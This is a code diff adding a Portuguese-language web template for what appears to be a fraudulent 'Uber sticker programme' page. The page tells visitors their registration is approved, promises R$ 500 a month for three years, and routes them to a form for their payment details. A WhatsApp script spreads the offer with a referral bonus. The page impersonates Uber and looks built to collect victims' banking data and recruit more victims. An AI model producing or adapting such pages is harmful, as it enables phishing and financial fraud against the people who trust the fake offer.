@@ -1,0 +1,184 @@
+{% extends "layout.html" %}
+
+{% block extra_head %}
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+/* Force green button style with maximum specificity */
+button.green-payment-button, 
+#green-payment-btn,
+button#green-payment-btn.green-payment-button {
+    background-color: #16a34a !important;
+    background: #16a34a !important;
+    color: #ffffff !important;
+    border: none !important;
+    font-weight: 700 !important;
+}
+
+button.green-payment-button:hover,
+button.green-payment-button:active,
+button.green-payment-button:focus,
+#green-payment-btn:hover,
+#green-payment-btn:active,
+#green-payment-btn:focus,
+button#green-payment-btn.green-payment-button:hover,
+button#green-payment-btn.green-payment-button:active,
+button#green-payment-btn.green-payment-button:focus {
+    background-color: #15803d !important;
+    background: #15803d !important;
+    color: #ffffff !important;
+    border: none !important;
+}
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="max-w-lg mx-auto px-4 py-8">
+    <!-- Success Message -->
+    <div class="text-center mb-8">
+        <div class="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-4">
+            <i class="fa fa-check text-2xl text-green-600"></i>
+        </div>
+        <h1 class="text-2xl font-bold text-black mb-2">Cadastro Aprovado!</h1>
+        <p class="text-gray-600">Seu cadastro ainda não terminou. Continue para informar como deseja receber seu pagamento.</p>
+    </div>
+
+    <!-- Next Steps -->
+    <div class="p-6 mb-6" style="background-color: #EEEEEE; border-radius: 0px;">
+        <h2 class="text-lg font-semibold mb-4" style="color: black !important;">Próximos Passos</h2>
+        <div class="space-y-4">
+            <div class="flex items-start space-x-3">
+                <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">1</div>
+                <p style="color: black !important;">Receber o adesivo da Uber em casa</p>
+            </div>
+            <div class="flex items-start space-x-3">
+                <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">2</div>
+                <p style="color: black !important;">Instalar o adesivo no parabrisa traseiro do seu veículo</p>
+            </div>
+            <div class="flex items-start space-x-3">
+                <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">3</div>
+                <p style="color: black !important;">Enviar foto do adesivo instalado para a Uber</p>
+            </div>
+            <div class="flex items-start space-x-3">
+                <div class="flex-shrink-0 w-6 h-6 bg-black text-white flex items-center justify-center text-sm font-bold" style="border-radius: 0px;">4</div>
+                <p style="color: black !important;">Receber o pagamento mensal de <strong style="color: black !important;">R$ 500,00</strong> todo dia 10</p>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- Payment Setup Info -->
+    <div class="p-4 mb-6" style="background-color: #EEEEEE; border-radius: 0px;">
+        <div class="flex">
+            <div class="flex-shrink-0">
+            </div>
+            <div class="ml-3">
+                <p class="text-sm" style="color: black !important;">
+                    <strong style="color: black !important;">Próximo passo:</strong> Clique no botão abaixo e escolha como deseja receber o pagamento mensal.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Continue Button -->
+    <div class="text-center">
+        <button onclick="window.location.href='/recebedor'" 
+            id="green-payment-btn"
+            class="green-payment-button" 
+            style="background-color: #16a34a !important; background: #16a34a !important; color: #ffffff !important; border-radius: 2px !important; padding: 12px 24px !important; border: none !important; font-weight: 700 !important; width: 100% !important; font-size: 16px !important;">
+            <i class="fa fa-arrow-right mr-2"></i>Informar Dados de Pagamento
+        </button>
+    </div>
+</div>
+
+<script>
+// WhatsApp sharing function
+function shareOnWhatsApp() {
+    const message = `🚗 *Programa de Adesivação Uber* 🚗
+
+Oi! Descobri um programa incrível da Uber onde ganho R$ 500 por mês só por ter o adesivo no meu carro!
+
+✅ R$ 500/mês garantidos por 3 anos
+✅ Compatível com 99, inDriver e outros apps
+✅ Processo 100% online
+✅ Sem taxas ou mensalidades
+
+E o melhor: se você se cadastrar através do meu convite, EU ganho R$ 65 de bônus! 💰
+
+Link para cadastro:
+${window.location.origin}
+
+Aproveite essa oportunidade única! 🎯`;
+
+    const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
+    window.open(whatsappUrl, '_blank');
+}
+
+// Force green button color
+function forceGreenButton() {
+    const greenBtn = document.getElementById('green-payment-btn');
+    if (greenBtn) {
+        greenBtn.style.cssText = `
+            background-color: #16a34a !important;
+            background: #16a34a !important;
+            color: #ffffff !important;
+            border-radius: 2px !important;
+            padding: 12px 24px !important;
+            border: none !important;
+            font-weight: 700 !important;
+            width: 100% !important;
+            font-size: 16px !important;
+        `;
+        
+        // Force hover and active states
+        greenBtn.addEventListener('mouseenter', function() {
+            this.style.cssText = `
+                background-color: #15803d !important;
+                background: #15803d !important;
+                color: #ffffff !important;
+                border-radius: 2px !important;
+                padding: 12px 24px !important;
+                border: none !important;
+                font-weight: 700 !important;
+                width: 100% !important;
+                font-size: 16px !important;
+            `;
+        });
+        
+        greenBtn.addEventListener('mouseleave', function() {
+            this.style.cssText = `
+                background-color: #16a34a !important;
+                background: #16a34a !important;
+                color: #ffffff !important;
+                border-radius: 2px !important;
+                padding: 12px 24px !important;
+                border: none !important;
+                font-weight: 700 !important;
+                width: 100% !important;
+                font-size: 16px !important;
+            `;
+        });
+        
+        greenBtn.addEventListener('mousedown', function() {
+            this.style.cssText = `
+                background-color: #15803d !important;
+                background: #15803d !important;
+                color: #ffffff !important;
+                border-radius: 2px !important;
+                padding: 12px 24px !important;
+                border: none !important;
+                font-weight: 700 !important;
+                width: 100% !important;
+                font-size: 16px !important;
+            `;
+        });
+        
+        console.log('Green button forced with hover states!');
+    }
+}
+
+// Execute on DOM ready and with delays
+document.addEventListener('DOMContentLoaded', forceGreenButton);
+setTimeout(forceGreenButton, 100);
+setTimeout(forceGreenButton, 500);
+setTimeout(forceGreenButton, 1000);
+</script>
+{% endblock %}
